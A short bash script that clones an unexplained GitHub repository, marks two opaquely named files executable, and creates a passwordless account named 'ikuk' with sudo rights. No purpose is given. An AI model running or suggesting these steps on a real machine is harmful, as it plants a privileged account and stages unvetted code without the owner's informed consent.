#!/bin/bash
sudo apt update
git clone https://github.com/gembock/gasz.git && cd gasz
chmod +x kekeh.sh && chmod +x cley
sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
sudo apt update

